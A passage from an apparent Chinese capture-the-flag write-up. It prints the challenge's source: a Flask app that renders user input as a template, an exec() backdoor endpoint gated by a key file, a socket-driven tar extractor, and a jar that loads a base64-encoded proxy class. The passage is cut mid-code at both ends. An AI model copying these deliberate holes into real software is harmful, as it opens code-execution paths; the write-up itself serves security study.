punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现又弹不了，看来不出网</p><p>先读几个文件</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><a href="http://www.py/">www.py</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">inedx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/?name=hello"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>name<span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>api.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">,</span> time<span class="token punctuation">,</span> threading<span class="token punctuation">,</span> socket<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mysql_keepalive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token string">'ctf'</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">,</span>        <span class="token string">'host'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'database'</span><span class="token punctuation">:</span> <span class="token string">'mysql'</span><span class="token punctuation">,</span>        <span class="token string">'port'</span><span class="token punctuation">:</span> <span class="token number">6666</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        db_connection <span class="token operator">=</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token operator">**</span>config<span class="token punctuation">)</span>        cursor <span class="token operator">=</span> db_connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT VERSION();"</span><span class="token punctuation">)</span>            cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"连接中断: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>err<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handle_client_connection</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            client_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'&#123;"code":0, "path": ""&#125;'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error handling client: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update_api</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    host <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span>    port <span class="token operator">=</span> <span class="token number">7777</span>    server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"update_api Listening on port </span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        handle_client_connection<span class="token punctuation">(</span>client_socket<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/evil'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./evil.key"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"ok"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"key error"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>mysql_keepalive<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>update_api<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看起来是本地连接数据库的接口</p><p>update.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">import</span> socket<span class="token keyword">import</span> tarfile<span class="token keyword">def</span> <span class="token function">extract_specific_file</span><span class="token punctuation">(</span>tar_path<span class="token punctuation">,</span> file_name<span class="token punctuation">,</span> extract_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>tar_path<span class="token punctuation">,</span> <span class="token string">"r:gz"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>        file_info <span class="token operator">=</span> tar<span class="token punctuation">.</span>getmember<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>extract<span class="token punctuation">(</span>file_info<span class="token punctuation">,</span> path<span class="token operator">=</span>extract_path<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        js <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> js<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            extract_specific_file<span class="token punctuation">(</span>js<span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'new.bin'</span><span class="token punctuation">,</span> <span class="token string">"/updatedir"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'Error'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有evil.key和sql-proxy.jar</p><p>明显flag没权限读</p><p>那把这个jar包导到本地看看</p><p>Main.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Base64ClassLoader</span> base64ClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Base64ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> cls <span class="token operator">=</span> base64ClassLoader<span class="token punctuation">.</span><span class="token function">loadClassFromBase64</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADcArQoAIQBZCQAgAFoIAFsHAFwKAAQAXQoABABeCQBfAGAKAAoAYQoAYgBjBwBkCgAKAGUHAGYSAAAAawoADABsCgAMAG0SAAEAawcAbwoAEQBwBwBxCgAEAHIKABMAcwoACgB0CgAKAHUKAEwAdgoAIAB3CgBNAHIKAEwAcgoACgByCgBNAHgKAE0AeQoAIAB6BwB7BwB8AQABYwEAAUkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAMc291cmNlU29ja2V0AQARTGphdmEvbmV0L1NvY2tldDsBABFkZXN0aW5hdGlvblNvY2tldAEAE3NvdXJjZVRvRGVzdGluYXRpb24BABJMamF2YS9sYW5nL1RocmVhZDsBABNkZXN0aW5hdGlvblRvU291cmNlAQAFdmFyMTABABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR2YXI5AQAVTGphdmEvbGFuZy9UaHJvd2FibGU7AQAFdmFyMTEBAAxzZXJ2ZXJTb2NrZXQBABdMamF2YS9uZXQvU2VydmVyU29ja2V0OwEABXZhcjEyAQAEdGhpcwEAD0xjb20vY3RmL1Byb3h5OwEACnNvdXJjZVBvcnQBAA9kZXN0aW5hdGlvbkhvc3QBABJMamF2YS9sYW5nL1N0cmluZzsBAA9kZXN0aW5hdGlvblBvcnQBAA1TdGFja01hcFRhYmxlBwB9AQALZm9yd2FyZERhdGEBACUoTGphdmEvbmV0L1NvY2tldDtMamF2YS9uZXQvU29ja2V0OylWAQAGYnVmZmVyAQACW0IBAARyZWFkAQAEdmFyOAEADG91dHB1dFN0cmVhbQEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAR2YXI3AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAtpbnB1dFNvY2tldAEADG91dHB1dFNvY2tldAcAfgcAfwcAQgEABHNlbmQBABwoTGphdmEvaW8vT3V0cHV0U3RyZWFtO1tCSSlWAQABbwEABGRhdGEBAApFeGNlcHRpb25zBwCAAQAMbGFtYmRhJG5ldyQxAQAMbGFtYmRhJG5ldyQwAQAKU291cmNlRmlsZQEAClByb3h5LmphdmEMACQAJQwAIgAjAQAJMTI3LjAuMC4xAQAVamF2YS9uZXQvU2VydmVyU29ja2V0DAAkAIEMAIIAgwcAhAwAhQCGDACHAIgHAIkMAIoAiwEAD2phdmEvbmV0L1NvY2tldAwAJACMAQAQamF2YS9sYW5nL1RocmVhZAEAEEJvb3RzdHJhcE1ldGhvZHMPBgCNEAAlDwcAjgwAjwCQDAAkAJEMAJIAJQ8HAJMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACUACUBABNqYXZhL2xhbmcvVGhyb3dhYmxlDACVACUMAJYAlwwAmACZDACaAJsMAEMAnAwATwBQDACdAJ4MAJ8AJQwAPwBAAQANY29tL2N0Zi9Qcm94eQEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JbnB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEABChJKVYBAAZhY2NlcHQBABMoKUxqYXZhL25ldC9Tb2NrZXQ7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAFmdldFJlbW90ZVNvY2tldEFkZHJlc3MBABooKUxqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgoAoAChCgAgAKIBAANydW4BAEcoTGNvbS9jdGYvUHJveHk7TGphdmEvbmV0L1NvY2tldDtMamF2YS9uZXQvU29ja2V0OylMamF2YS9sYW5nL1J1bm5hYmxlOwEAFyhMamF2YS9sYW5nL1J1bm5hYmxlOylWAQAFc3RhcnQKACAAowEAD3ByaW50U3RhY2tUcmFjZQEABWNsb3NlAQANYWRkU3VwcHJlc3NlZAEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsB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"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64里的代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocket</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Proxy</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> sourcePort <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> destinationHost <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>        <span class="token keyword">short</span> destinationPort <span class="token operator">=</span> <span class="token number">3306</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ServerSocket</span> serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span>sourcePort<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                            <span class="token class-name">Socket</span> sourceSocket <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sourceSocket<span class="token punctuation">.</span><span class="token function">getRemoteSocketAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">Socket</span> destinationSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>destinationHost<span class="token punctuation">,</span> destinationPort<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">Thread</span> sourceToDestination <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">forwardData</span><span class="token punctuation">(</span>sourceSocket<span class="token punctuation">,</span> destinationSocket<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            sourceToDestination<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">Thread</span> destinationToSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">forwardData</span><span class="token punctuation">(</span>destinationSocket<span class="token punctuation">,</span> sourceSocket<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            destinationToSource<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            var10<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var11<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    serverSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    var11<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">throw</span> var11<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var12<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">forwardData</span><span class="token punctuation">(</span><span class="token class-name">Socket</span> inputSocket<span class="token punctuation">,</span> <span class="token class-name">Socket</span> outputSocket<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> inputSocket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token 